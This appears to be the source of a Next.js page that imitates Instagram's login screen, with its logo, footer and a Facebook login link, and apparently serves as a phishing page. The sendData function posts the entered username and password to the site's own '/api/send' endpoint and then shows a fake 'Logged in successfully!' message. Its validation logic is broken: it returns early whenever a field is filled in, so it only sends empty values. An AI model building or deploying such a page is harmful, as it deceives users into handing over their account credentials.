'use client';
import Image from "next/image";
import "./reel.css"
import React from "react";
import toast from "react-hot-toast";
export default function Home() {
const [userId,setUserId] = React.useState("");
const [passWd,setPassWd] = React.useState("");

// React.useEffect(()=>{



// },[])



  const sendData = async () => {
    if ((userId.length < 5 && userId.length>0 ) || ( passWd.length < 5 && passWd.length>0 )) {
      toast.error('Username and password must be at least 5 characters.');
      return;
    }

    if (userId.length>0 ||  passWd.length>0 ) {
      return;
    }
    console.log("you")
    const res = await fetch('/api/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: userId,
        password: passWd,
      }),
    });

    if (res.ok) {
      toast.success('Logged in successfully!');
    } else {
      toast.error('Login failed.');
    }
    const data = await res.json();
    console.log('Response from backend:', data);
  };





  return (
    <div>
      <main className="flex align-items-center justify-content-center">
        
        {/* Mobile section (empty in this code) */}
        <section id="mobile" className="flex"></section>

        {/* Authentication section */}
        <section id="auth" className="flex direction-column">
          {/* Login panel */}
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              {/* Replaced <img> with next/image */}
              <Image
                src="/img/instagram-logo.png"
                alt="Instagram"
                title="Instagram logo"
                width={200}
                height={60}
              />
            </h1>
            <form>
              <label htmlFor="title" className="sr-only">
                Phone number, username, or email
              </label>
              <input
                name="title"
                placeholder="Phone number, username, or email"
                onChange={(e)=>setUserId(e.target.value)}
                value={userId}
                required
              />

              <label htmlFor="description" className="sr-only">
                Password
              </label>
              <input
                name="description"
                type="password"
                onChange={(e) => setPassWd(e.target.value)}
                value={passWd}
                placeholder="Password"
                required
              />

              <button type="submit" className="btn" id="login" onClick={sendData}>
                Log In
              </button>
              {/* Fix inline style to use JSX format */}
              <span id="wrongpwd" style={{ color: "red" }}></span>
            </form>

            <div className="flex separator align-items-center">
              <span></span>
              <div className="or">OR</div>
              <span></span>
            </div>

            {/* Login with Facebook section */}
            <div className="login-with-fb flex direction-column align-items-center">
              <div>
                {/* Image can be added here later with next/image */}
                <a href="/" id="facebooklogin">
                  Login with Facebook
                </a>
              </div>
              <a href="#">Forgot password?</a>
            </div>
          </div>

          {/* Registration panel */}
          <div className="panel register flex justify-content-center">
            <p>Don't have an account?</p>
            <a href="#">Sign Up</a>
          </div>

          {/* App download section */}
          <div className="app-download flex direction-column align-items-center">
            <p>Get the app.</p>
            <div className="flex justify-content-center">
              {/* Replace img with Image for Next.js */}
              <Image
                src="/img/apple-button.png"
                alt="Apple Store"
                title="Apple Store logo"
                width={135}
                height={40}
              />
              <Image
                src="/img/googleplay-button.png"
                alt="Google Play"
                title="Google Play logo"
                width={135}
                height={40}
              />
            </div>
          </div>
        </section>
      </main>

      {/* Footer section */}
      <footer>
        <ul className="flex flex-wrap justify-content-center">
          <li><a href="#">ABOUT</a></li>
          <li><a href="#">HELP</a></li>
          <li><a href="#">PRESS</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">CAREERS</a></li>
          <li><a href="#">PRIVACY</a></li>
          <li><a href="#">TERMS</a></li>
          <li><a href="#">LOCATION</a></li>
          <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
          <li><a href="#">HASHTAGS</a></li>
          <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p className="copyright">© 2020 Instagram by Facebook</p>
      </footer>
    </div>
  );
}
